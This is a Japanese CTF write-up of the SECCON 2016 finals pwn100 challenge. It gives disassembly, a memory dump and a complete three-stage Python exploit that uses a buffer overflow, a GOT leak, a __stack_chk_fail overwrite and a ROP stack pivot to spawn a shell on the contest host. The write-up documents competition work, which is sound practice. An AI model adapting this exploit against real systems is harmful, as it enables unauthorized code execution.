---
layout: post
title: SECCON 2016 FINALS writeup
---

elfでSECCON決勝に参加していました.
結果は23/24でしんどかったです.

pwn100しか解けなかったけどwriteup.

![](https://tsunpoko.github.io/images/seccon2016finals_enquete.png)

2回の入力がある.
1回目の入力でBOFがあり,

{% highlight nasm %}
 80485ed:	e8 40 00 00 00       	call   8048632 <getaline>
 80485f2:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
 80485f5:	89 44 24 0c          	mov    DWORD PTR [esp+0xc],eax
 80485f9:	8d 45 b4             	lea    eax,[ebp-0x4c]
 80485fc:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 8048600:	c7 44 24 04 bb 87 04 	mov    DWORD PTR [esp+0x4],0x80487bb
 8048607:	08 
 8048608:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 804860f:	e8 bc fd ff ff       	call   80483d0 <dprintf@plt>
{% endhighlight %}

{% highlight shell %}
gdb-peda$ x/40xw 0xffffd3cc
0xffffd3cc:	0x41414141	0x00000000	0x00000000	0xffffd498
0xffffd3dc:	0xf7e41b74	0xf7fb93cc	0xffffd3fc	0x00000000
0xffffd3ec:	0xf7fb9000	0x00000000	0xf7fb9000	0x00000000
0xffffd3fc:	0x0622705a	0xffffd498	0xf7ff04c0	0xf7fb9000
0xffffd40c:	0xdf866000	0x00000000	0xf7e42016	0xffffd498
0xffffd41c:	0x0804859a	0x08048745	0xffffd44c	0xffffd44
{% endhighlight %}


{% highlight c %}
dprintf("Hi, %s\n%s\n>>", 0xffffd3cc, 0x08048745);
                         [user input]
{% endhighlight %}

getaline()直後に*(ebp+0x8)をeaxに入れて, それをdprintfの第3引数に指定しているのでここで任意のアドレスが読めます.

この場合*(ebp+0x8)は0xffffd420 -> 0x08048745です.

0xffffd420 - 0xffffd3cc = 84

{% highlight nasm %}
 8048614:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 8048617:	89 04 24             	mov    DWORD PTR [esp],eax
 804861a:	e8 13 00 00 00       	call   8048632 <getaline>
{% endhighlight  %}

*(ebp+0xc)を引数としてgetaline()を呼んでいるので, ここを任意のアドレスにすればそこに書き込みが出来そうです.

攻撃の流れとして, 3ステージに分かれていて

[stage1]
任意のアドレスが読めるのでgotの値を呼んでinformation leakします.
ここで必ず__stack_chk_fail()に引っかかるので, __stack_chk_fail@gotをmainに向けます.

[stage2]
任意のアドレスが読めますが, もうlibcはleakしたので適当で良いです.
書き込み先をbssにして, rop chainを仕込みます.
__stack_chk_fail@gotはまだmainなので再度ret2vuln.

[stage3]
読むアドレスは適当です.
__stack_chk_fail@gotにleave; ret;のrop gadgetを書き込みます.
この際にebpには, bss - 4のアドレスを積んでおきstack pivotでespをrop chainが積まれているbss領域に向けます.
__stack_chk_fail()に引っかかるので, rop発動で終了です.


以下exploit

{% highlight python %}
from No___Op import *

if len(sys.argv) > 1:
    target = '10.100.6.1:28353'
    offset = {
        'rand': 0x0034010,
        '__libc_start_main': 0x19a00,
        'system': 0x40310,
        '/bin/sh': 0x16084c, # str
    }


else:
    target = 'localhost:4444'
    offset = {
        'rand': 0x34010,
        '__libc_start_main': 0x19a00,
        'system': 0x40310,
        '/bin/sh': 0x16084c, # str
    }

c =  Pwning( target )

got_chkfail = 0x804a018
addr_bss = 0x0804a034 + 0x800
addr_main = 0x0804852d
got_rand = 0x804a028
leave_ret = 0x80485c0

########stage1
pay1  = 'a' * 84
pay1 += p32(got_rand)
pay1 += p32(got_chkfail)

pay2 = p32(addr_main)

c.sendall(pay1)
c.sendall(pay2)

info('stage1')

c.read_until('a' * 84)

c.recv(9)

libc_rand = u32(c.recv(4))

libc_base = libc_rand - offset['rand']
libc_system = libc_base + offset['system']
libc_binsh = libc_base + offset['/bin/sh']

succ(hex(libc_base))
succ(hex(libc_system))
succ(hex(libc_binsh))

########stage2

pay1  = 'b' * 84
pay1 += p32(libc_binsh)
pay1 += p32(addr_bss)

pay2  = ''
pay2 += p32(libc_system)
pay2 += 'kasu'
pay2 += p32(libc_binsh)
pay2 += 'c' * (64 - len(pay2))
raw_input()

c.sendall(pay1)
c.sendall(pay2)

info('stage2')


########stage3

pay1  = 'd' * 76
pay1 += p32(addr_bss - 4) #ebp
pay1 += p32(leave_ret) #eip
pay1 += p32(libc_binsh)
pay1 += p32(got_chkfail)

pay2  = p32(leave_ret)
pay2 += 'BBBB'
raw_input()

c.sendall(pay1)
c.sendall(pay2)

info('stage3')

c.shell()
{% endhighlight %}
